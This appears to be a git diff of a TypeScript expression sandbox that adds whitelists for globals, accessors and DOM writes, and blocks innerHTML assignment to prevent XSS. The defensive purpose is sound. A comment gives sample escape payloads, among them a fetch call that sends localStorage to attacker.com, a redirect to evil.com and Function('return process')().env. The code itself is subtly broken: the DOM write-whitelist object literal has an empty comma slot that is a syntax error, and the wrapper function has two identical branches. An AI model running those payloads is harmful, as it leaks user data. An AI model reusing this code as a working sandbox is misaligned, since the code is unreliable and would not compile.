@@ -139,11 +139,23 @@ const SAFE_METHODS: { [key: string]: 1 } = {
   setUTCFullYear: 1, setUTCMonth: 1, setUTCDate: 1,
   setUTCHours: 1, setUTCMinutes: 1, setUTCSeconds: 1, setUTCMilliseconds: 1,
   // Map/Set methods
-  keys: 1, values: 1, entries: 1, get: 1, has: 1, set: 1, add: 1, delete: 1, clear: 1, size: 1,
+  keys: 1, values: 1, entries: 1, get: 1, has: 1, set: 1, add: 1, delete: 1, clear: 1,
+  // Promise methods (CRITICAL FIX: Issue #5 - Promises were unusable)
+  then: 1, catch: 1, finally: 1,
   // RegExp methods
   test: 1, exec: 1,
   // Length property (needed for arrays/strings)
   length: 1
+} as any;
+
+/**
+ * Safe Accessor Properties - getters/setters that are safe to access.
+ * These are typically on prototypes and return primitive values or safe objects.
+ */
+const SAFE_ACCESSORS: { [key: string]: 1 } = {
+  __proto__: null,
+  // Map/Set size property (getter on prototype)
+  size: 1
 } as any;
 
 /**
@@ -152,12 +164,19 @@ const SAFE_METHODS: { [key: string]: 1 } = {
 const membraneCache = new WeakMap<object, any>();
 
 /**
+ * WeakMap to cache function wrappers to ensure method identity stability
+ * Key: original function, Value: Map<thisArg, wrapped function>
+ */
+const functionWrapperCache = new WeakMap<Function, WeakMap<any, Function>>();
+
+/**
  * Creates an unbypassable security membrane around an object using Proxy.
  * This implements the WHITE-LIST ONLY security model.
  *
  * The membrane:
  * - ALLOWS: Own data properties (via hasOwnProperty - NOT 'in' operator)
  * - ALLOWS: Safe standard methods (from SAFE_METHODS whitelist)
+ * - ALLOWS: Safe accessor properties (from SAFE_ACCESSORS - Map.size, etc.)
  * - ALLOWS: Well-known symbols (iterators, toPrimitive)
  * - DENIES: Everything else (prototype chain, constructor, __proto__, etc.)
  *
@@ -212,7 +231,18 @@ export function createMembrane(target: any): any {
         return value;
       }
 
-      // 3. ALLOW: Safe Standard Methods (map, filter, etc.)
+      // 3. ALLOW: Safe Accessor Properties (Map.size, Set.size, etc.)
+      // These are getters on the prototype that return safe primitive values
+      if (SAFE_ACCESSORS[keyStr]) {
+        const value = Reflect.get(obj, key);
+        // Accessors should return primitives or be wrapped if they return objects
+        if (value != null && typeof value === 'object') {
+          return createMembrane(value);
+        }
+        return value;
+      }
+
+      // 4. ALLOW: Safe Standard Methods (map, filter, etc.)
       // Only allow if the method exists on the target AND is in our safe list
       if (SAFE_METHODS[keyStr] && typeof obj[key] === 'function') {
         const value = obj[key];
@@ -235,21 +265,15 @@ export function createMembrane(target: any): any {
 
         if (isNativeWithInternalSlots) {
           // Bind method to original target and wrap return values
-          return function(...args: any[]) {
-            const result = value.apply(obj, args);
-            // Recursively wrap object/function return values
-            if (result != null && (typeof result === 'object' || typeof result === 'function')) {
-              return createMembrane(result);
-            }
-            return result;
-          };
+          // CRITICAL FIX: Use cached wrapper for method identity stability
+          return createCachedFunctionWrapper(value, obj, true);
         }
 
         // For non-native objects, wrap the function
         return createFunctionWrapper(value, obj);
       }
 
-      // 4. DENY: Everything else
+      // 5. DENY: Everything else
       // This blocks prototype chain traversal, unknown globals, and future browser features
       return undefined;
     },
@@ -263,7 +287,8 @@ export function createMembrane(target: any): any {
     // Strategy:
     // 1. Return TRUE for own properties (normal behavior)
     // 2. Return TRUE for safe methods (allow method calls)
-    // 3. Return FALSE for everything else (allow safe global scope lookup)
+    // 3. Return TRUE for safe accessors (allow Map.size, Set.size, etc.)
+    // 4. Return FALSE for everything else (allow safe global scope lookup)
     has(obj, key) {
       // Special handling for Symbol.unscopables (used by with statement)
       if (key === Symbol.unscopables) {
@@ -274,6 +299,11 @@ export function createMembrane(target: any): any {
 
       // Own properties are visible
       if (Object.prototype.hasOwnProperty.call(obj, keyStr)) {
+        return true;
+      }
+
+      // Safe accessors are visible
+      if (SAFE_ACCESSORS[keyStr]) {
         return true;
       }
 
@@ -361,14 +391,65 @@ function createFunctionWrapper(fn: Function, thisArg: any): Function {
   };
 }
 
+/**
+ * Creates a CACHED wrapped function to ensure method identity stability.
+ *
+ * CRITICAL FIX (Issue #4): Without caching, accessing obj.method twice creates
+ * two different function instances, breaking equality checks:
+ * - state.items.map === state.items.map returns FALSE
+ * - Breaks React PureComponent, useEffect dependencies, etc.
+ *
+ * @param {Function} fn - Function to wrap
+ * @param {any} thisArg - The 'this' context for the function
+ * @param {boolean} bindNative - Whether this is a native method needing binding
+ * @returns {Function} Cached wrapped function
+ */
+function createCachedFunctionWrapper(fn: Function, thisArg: any, bindNative = false): Function {
+  // Get or create the cache for this function
+  let thisArgCache = functionWrapperCache.get(fn);
+  if (!thisArgCache) {
+    thisArgCache = new WeakMap();
+    functionWrapperCache.set(fn, thisArgCache);
+  }
+
+  // Check if we already have a wrapper for this thisArg
+  const cached = thisArgCache.get(thisArg);
+  if (cached) {
+    return cached;
+  }
+
+  // Create the wrapper
+  const wrapper = bindNative
+    ? function(...args: any[]) {
+        const result = fn.apply(thisArg, args);
+        // Recursively wrap object/function return values
+        if (result != null && (typeof result === 'object' || typeof result === 'function')) {
+          return createMembrane(result);
+        }
+        return result;
+      }
+    : function(...args: any[]) {
+        const result = fn.apply(thisArg, args);
+        // Recursively wrap object/function return values
+        if (result != null && (typeof result === 'object' || typeof result === 'function')) {
+          return createMembrane(result);
+        }
+        return result;
+      };
+
+  // Cache and return
+  thisArgCache.set(thisArg, wrapper);
+  return wrapper;
+}
+
 // === ELEMENT MEMBRANE: DOM Security ===
 
 /**
- * Safe DOM properties and methods that are allowed on $el
+ * Safe DOM properties that can be READ on $el
  */
-const SAFE_DOM_PROPS: { [key: string]: 1 } = {
+const SAFE_DOM_READ_PROPS: { [key: string]: 1 } = {
   __proto__: null,
-  // Element properties
+  // Element properties (read-only or safe to read)
   id: 1, className: 1, tagName: 1, nodeName: 1, nodeType: 1,
   textContent: 1, innerHTML: 1, innerText: 1, value: 1,
   checked: 1, disabled: 1, selected: 1, hidden: 1,
@@ -404,6 +485,22 @@ const SAFE_DOM_PROPS: { [key: string]: 1 } = {
 } as any;
 
 /**
+ * Safe DOM properties that can be WRITTEN on $el
+ *
+ * CRITICAL SECURITY (Issue #2): innerHTML and outerHTML are EXCLUDED from write list
+ * to prevent XSS attacks. Reading is allowed, but setting must go through SafeHTML.
+ */
+const SAFE_DOM_WRITE_PROPS: { [key: string]: 1 } = {
+  __proto__: null,
+  // Element properties (safe to write)
+  id: 1, className: 1,
+  textContent: 1, /* innerHTML: BLOCKED */, innerText: 1, value: 1,
+  checked: 1, disabled: 1, selected: 1, hidden: 1,
+  scrollLeft: 1, scrollTop: 1,
+  // Note: setAttribute, style, classList, dataset are methods/objects - setting is handled by their own APIs
+} as any;
+
+/**
  * WeakMap to cache element membranes to avoid creating duplicate proxies
  */
 const elementMembraneCache = new WeakMap<object, any>();
@@ -436,8 +533,8 @@ export function createElementMembrane(element: any): any {
     get(el, key) {
       const keyStr = typeof key === 'symbol' ? key.toString() : String(key);
 
-      // ONLY allow properties in the safe whitelist
-      if (!SAFE_DOM_PROPS[keyStr]) {
+      // ONLY allow properties in the safe READ whitelist
+      if (!SAFE_DOM_READ_PROPS[keyStr]) {
         // Silently return undefined for non-whitelisted properties
         return undefined;
       }
@@ -497,10 +594,14 @@ export function createElementMembrane(element: any): any {
     set(el, key, value) {
       const keyStr = typeof key === 'symbol' ? key.toString() : String(key);
 
-      // Only allow setting whitelisted properties
-      if (!SAFE_DOM_PROPS[keyStr]) {
+      // CRITICAL SECURITY (Issue #2): Only allow setting WRITE-whitelisted properties
+      // innerHTML/outerHTML are excluded to prevent XSS - must use SafeHTML via m-html
+      if (!SAFE_DOM_WRITE_PROPS[keyStr]) {
         throw new Error(
-          `Reflex Security: Cannot set property "${keyStr}" on $el`
+          `Reflex Security: Cannot set property "${keyStr}" on $el. ` +
+          (keyStr === 'innerHTML' || keyStr === 'outerHTML'
+            ? `Use the m-html directive with SafeHTML instead to prevent XSS.`
+            : `Property is not in the write whitelist.`)
         );
       }
 
@@ -510,8 +611,8 @@ export function createElementMembrane(element: any): any {
     has(el, key) {
       const keyStr = typeof key === 'symbol' ? key.toString() : String(key);
 
-      // Only show whitelisted properties
-      return !!SAFE_DOM_PROPS[keyStr] && Reflect.has(el, key);
+      // Only show whitelisted properties (use read list for visibility)
+      return !!SAFE_DOM_READ_PROPS[keyStr] && Reflect.has(el, key);
     }
   });
 
@@ -519,4 +620,119 @@ export function createElementMembrane(element: any): any {
   elementMembraneCache.set(element, membrane);
 
   return membrane;
+}
+
+// === GLOBAL BARRIER: Prevents Standard Mode Global Scope Escape ===
+
+/**
+ * Safe global objects and functions allowed in expressions.
+ *
+ * CRITICAL SECURITY (Issue #1): Without this whitelist, Standard Mode allows
+ * RCE via global scope access: {{ window.location }}, {{ process.env }}, etc.
+ */
+const SAFE_GLOBALS: { [key: string]: any } = {
+  __proto__: null,
+  // Safe constructors
+  Math: typeof Math !== 'undefined' ? Math : undefined,
+  Date: typeof Date !== 'undefined' ? Date : undefined,
+  Array: typeof Array !== 'undefined' ? Array : undefined,
+  Number: typeof Number !== 'undefined' ? Number : undefined,
+  String: typeof String !== 'undefined' ? String : undefined,
+  Boolean: typeof Boolean !== 'undefined' ? Boolean : undefined,
+  Object: typeof Object !== 'undefined' ? {
+    keys: Object.keys,
+    values: Object.values,
+    entries: Object.entries,
+    fromEntries: Object.fromEntries,
+    assign: Object.assign,
+    is: Object.is
+  } : undefined,
+  JSON: typeof JSON !== 'undefined' ? JSON : undefined,
+  Promise: typeof Promise !== 'undefined' ? Promise : undefined,
+  Symbol: typeof Symbol !== 'undefined' ? Symbol : undefined,
+  BigInt: typeof BigInt !== 'undefined' ? BigInt : undefined,
+  Map: typeof Map !== 'undefined' ? Map : undefined,
+  Set: typeof Set !== 'undefined' ? Set : undefined,
+  WeakMap: typeof WeakMap !== 'undefined' ? WeakMap : undefined,
+  WeakSet: typeof WeakSet !== 'undefined' ? WeakSet : undefined,
+  RegExp: typeof RegExp !== 'undefined' ? RegExp : undefined,
+  Error: typeof Error !== 'undefined' ? Error : undefined,
+  // Safe functions
+  parseInt: typeof parseInt !== 'undefined' ? parseInt : undefined,
+  parseFloat: typeof parseFloat !== 'undefined' ? parseFloat : undefined,
+  isNaN: typeof isNaN !== 'undefined' ? isNaN : undefined,
+  isFinite: typeof isFinite !== 'undefined' ? isFinite : undefined,
+  // Constants
+  NaN: NaN,
+  Infinity: Infinity,
+  undefined: undefined,
+  // Console (safe for logging, read-only)
+  console: typeof console !== 'undefined' ? console : undefined
+};
+
+/**
+ * Creates a Global Barrier proxy that blocks access to dangerous globals
+ * while allowing safe globals through a whitelist.
+ *
+ * CRITICAL SECURITY FIX (Issue #1): Standard Mode Global Escape
+ *
+ * Without this barrier, expressions can access the global scope:
+ * - {{ window.location.href = 'http://evil.com' }} - RCE
+ * - {{ fetch('http://attacker.com', { body: localStorage }) }} - Data exfiltration
+ * - {{ Function('return process')().env }} - Server-side RCE
+ *
+ * The barrier works with the `with` statement:
+ * ```javascript
+ * with(GlobalBarrier) { with(c) { with(s) { return expression } } }
+ * ```
+ *
+ * When JavaScript evaluates a variable:
+ * 1. First checks `has(GlobalBarrier, 'variableName')`
+ * 2. If TRUE, calls `get(GlobalBarrier, 'variableName')` - returns our whitelisted value or undefined
+ * 3. If FALSE, looks in outer scope (context c, then state s)
+ *
+ * Strategy:
+ * - `has` returns TRUE for EVERYTHING (captures all global lookups)
+ * - `get` returns whitelisted globals or undefined (blocks dangerous access)
+ *
+ * @returns {Proxy} Global barrier proxy
+ */
+export function createGlobalBarrier(): any {
+  return new Proxy({}, {
+    has(_target, _key) {
+      // CRITICAL: Return TRUE for everything to prevent JavaScript from
+      // looking up variables in the outer (global) scope.
+      // This forces all global lookups to go through our `get` trap.
+      return true;
+    },
+
+    get(_target, key) {
+      if (typeof key === 'symbol') {
+        // Allow Symbol.unscopables for with statement compatibility
+        if (key === Symbol.unscopables) {
+          return undefined;
+        }
+        return undefined;
+      }
+
+      const keyStr = String(key);
+
+      // WHITELIST ONLY: Return safe globals, block everything else
+      if (Object.prototype.hasOwnProperty.call(SAFE_GLOBALS, keyStr)) {
+        return SAFE_GLOBALS[keyStr];
+      }
+
+      // DENY: All other globals (window, document, process, etc.)
+      // Return undefined instead of throwing to avoid breaking legitimate code
+      return undefined;
+    },
+
+    set(_target, key, _value) {
+      // Block ALL global assignments
+      throw new Error(
+        `Reflex Security: Cannot set global variable "${String(key)}". ` +
+        `Global scope modification is not allowed in expressions.`
+      );
+    }
+  });
 }
